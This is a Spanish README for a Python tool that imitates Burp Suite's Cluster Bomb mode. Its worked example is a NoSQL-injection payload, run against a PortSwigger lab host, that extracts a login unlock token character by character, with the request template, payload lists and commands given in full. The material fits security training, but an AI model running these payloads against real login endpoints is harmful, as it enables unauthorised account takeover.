# 🚀 Cuack-Bomb - Cluster Bomb Emulator para Burp Suite

**Cuack-Bomb** es un emulador de Cluster Bomb de Burp Suite, diseñado para ser **ultrarrápido, universal y automático**. Permite ejecutar ataques de fuerza bruta con inyección NoSQL y otros payloads, procesando miles de combinaciones en segundos en lugar de horas.

---

## 📋 Características

✅ **Velocidad extrema** - 30+ hilos concurrentes, hasta 50x más rápido que Burp Suite  
✅ **Universal** - Funciona con cualquier request.txt de Burp, sin modificar  
✅ **Auto-detección** - Detecta automáticamente la palabra clave de éxito  
✅ **HTTP/2 + HTTP/1.1** - Soporte completo para ambos protocolos  
✅ **Payloads flexibles** - Soporta archivos `.txt` y listas inline (ej: `§1,2,3§`)  
✅ **CSV nativo** - Resultados guardados en formato CSV para análisis en Excel  
✅ **Sin dependencias pesadas** - Solo usa `requests` y librerías estándar  

---

## 🛠️ Instalación

```bash
git clone https://github.com/tuusuario/cuack-bomb.git
cd cuack-bomb
pip install requests
o
sudo apt install python3-requests
```

---

## 📂 Estructura del Proyecto

```
cuack-bomb/
├── cluster-bomb.py      # Script principal
├── request.txt           # Petición de Burp con marcadores §
├── pos.txt              # Payloads para posición 1 (ej: números)
├── char.txt             # Payloads para posición 2 (ej: caracteres)
├── resultados.csv       # Resultados del ataque (se genera)
└── README.md            # Este archivo
```

---

## 🎯 Uso Rápido

```bash
# Uso básico (con detección automática de palabra clave)
python cluster-bomb.py request.txt

# Especificando archivo de salida
python cluster-bomb.py request.txt resultados.csv

# Con palabra clave específica
python cluster-bomb.py request.txt resultados.csv "Account locked"
```

---

## 📝 Formato del Archivo `request.txt`

El archivo debe ser exportado directamente desde Burp Suite, **sin modificaciones**:

```http
POST /login HTTP/2
Host: 0a7b00ed04ed3cae809108c100df00f4.web-security-academy.net
Content-Type: application/json
User-Agent: Mozilla/5.0
Cookie: session=...

{"username":"carlos","password":{"$ne":"invalid"},"$where":"this.unlockToken.match('^.{§pos.txt§}§char.txt§.*')"}
```

**Los marcadores `§`** indican dónde se insertarán las payloads:
- `§pos.txt§` → Carga payloads desde el archivo `pos.txt`
- `§char.txt§` → Carga payloads desde el archivo `char.txt`
- También soporta listas inline: `§0,1,2,3,4,5§`

---

## 📄 Archivos de Payloads

### `pos.txt` - Posiciones del token
```
0
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
```

### `char.txt` - Caracteres posibles
```
a
b
c
d
e
f
...
z
A
B
C
...
Z
0
1
2
...
9
_
-
```

---

## 📊 Análisis de Resultados

### Salida en consola:
```
[14:00:30] [INFO] === INICIANDO CLUSTER BOMB EMULATOR ===
[14:00:30] [INFO] Encontrados 2 marcadores en la petición
[14:00:30] [INFO] Total de combinaciones: 1472
[14:00:30] [INFO] Enviando 1472 peticiones con 30 hilos...
  Progreso: 1472/1472 (100.0%)
[14:01:19] [INFO] Completado en 48.65 segundos
[14:01:19] [SUCCESS] Palabra clave detectada: 'Account locked'
[14:01:19] [SUCCESS] ✅ Encontradas 23 peticiones con 'Account locked'
[14:01:19] [INFO]   ID 60: 0|8 -> Account locked
[14:01:19] [INFO]   ID 118: 1|2 -> Account locked
[14:01:19] [INFO]   ID 129: 2|b -> Account locked
...
```

### Archivo CSV generado (`resultados.csv`):
```csv
combination_id,combination,status_code,response_length,response_time,contains_Account_locked,response_preview
60,0|8,200,3500,0.85,True,"<!DOCTYPE html> <html> <!--LAB_HEAD_START--> ..."
118,1|2,200,3500,0.92,True,"<!DOCTYPE html> <html> <!--LAB_HEAD_START--> ..."
```

---

## 🔍 Detección Automática de Palabra Clave

Cuack-Bomb detecta automáticamente la palabra clave de éxito comparando:
1. Patrones comunes: `Account locked`, `Invalid`, `Error`, `Success`, `Welcome`
2. Diferencias en longitud de respuesta
3. Diferencias en el contenido textual

**También puedes especificarla manualmente:**
```bash
python cluster-bomb.py request.txt resultados.csv "Invalid username"
```

---

## ⚡ Rendimiento Comparativo

| Herramienta | Peticiones | Tiempo | Velocidad |
|-------------|------------|--------|-----------|
| Burp Suite (Cluster Bomb) | 1,472 | ~4 horas | 0.1 req/seg |
| **Cuack-Bomb** | 1,472 | **~49 segundos** | **30 req/seg** |

**¡50x más rápido!** 🚀

---

## 🎯 Ejemplo Práctico: Extraer Token NoSQL

1. **Exporta la petición de Burp**:
```http
POST /login HTTP/1.1
Host: 0a7b00ed04ed3cae809108c100df00f4.web-security-academy.net
Content-Type: application/json

{"username":"carlos","password":{"$ne":"invalid"},"$where":"this.unlockToken.match('^.{§pos.txt§}§char.txt§.*')"}
```

2. **Crea los archivos de payloads**:
```bash
# pos.txt - números 0-20
for i in {0..20}; do echo $i >> pos.txt; done

# char.txt - caracteres posibles
echo "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-" | fold -w1 > char.txt
```

3. **Ejecuta el ataque**:
```bash
python cluster-bomb.py request.txt
```

4. **Analiza los resultados**:
Los IDs con `Account locked` te mostrarán el token carácter por carácter:
```
ID 60: 0|8 -> Account locked   # Posición 0 = '8'
ID 118: 1|2 -> Account locked  # Posición 1 = '2'
ID 129: 2|b -> Account locked  # Posición 2 = 'b'
...
Token: 82bbaad259
```

---

## 🛠️ Configuración Avanzada

### Ajustar número de hilos
```python
emulator = BurpClusterBombEmulator(
    request_file="request.txt",
    max_workers=50,  # Más hilos = más rápido
    timeout=5        # Timeout por petición
)
```

### Usar listas inline (sin archivos)
```http
{"username":"carlos","$where":"this.token.match('^.{§0,1,2,3,4,5,6,7,8,9§}§a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z§.*')"}
```

---

## 🐛 Troubleshooting

### Error: "No se encontraron marcadores §"
Asegúrate de que el cuerpo de la petición contenga `§` marcando las posiciones de las payloads.

### Error: "No se encontró Host en las cabeceras"
Verifica que el archivo `request.txt` incluya la cabecera `Host:`.

### Todas las peticiones devuelven 500
- Revisa la sintaxis de tu payload (especialmente JSON)
- Verifica que la cookie de sesión sea válida
- Asegúrate de que los archivos de payloads no tengan caracteres especiales

---

## 📜 Licencia

MIT License - Libre para uso educativo y profesional.

---

## 🤝 Contribuciones

¡Las contribuciones son bienvenidas! Si encuentras un bug o quieres añadir una feature:
1. Fork el proyecto
2. Crea tu rama (`git checkout -b feature/AmazingFeature`)
3. Commit tus cambios (`git commit -m 'Add AmazingFeature'`)
4. Push a la rama (`git push origin feature/AmazingFeature`)
5. Abre un Pull Request

---

## 📞 Contacto

- **GitHub**: [@akthanon](https://github.com/akthanon)
- **Issues**: [Reportar bug](https://github.com/akthanon/cuack-bomb/issues)

---

**Hecho con ❤️ gracias a Deepseek para la comunidad de seguridad ofensiva**
